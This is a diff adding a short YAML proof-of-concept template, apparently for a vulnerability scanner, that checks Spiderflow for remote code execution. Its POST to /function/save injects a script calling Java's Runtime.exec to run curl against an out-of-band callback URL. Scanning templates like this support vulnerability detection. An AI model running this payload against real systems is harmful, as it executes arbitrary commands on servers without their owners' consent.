@@ -1,0 +1,23 @@
+name: yaml-poc-spiderflow-spiderflow-other-CT-469721
+binding: 04a21dc8-5923-40d5-a8eb-f3f7f3296886
+detail:
+    author: system_user
+    vulnerability:
+        id: 0652b522-48fe-46df-a9cf-6a45ea17ae38
+        level: critical
+transport: http
+set:
+    reverse: newReverse()
+    reverseURL: reverse.url
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /function/save
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+            body: id=&name=cmd&parameter=yw&script=}Java.type('java.lang.Runtime').getRuntime().exec('curl {{reverseURL}}');{
+            follow_redirects: false
+        expression: response.status == 200 && reverse.wait(5)
+expression: r0()
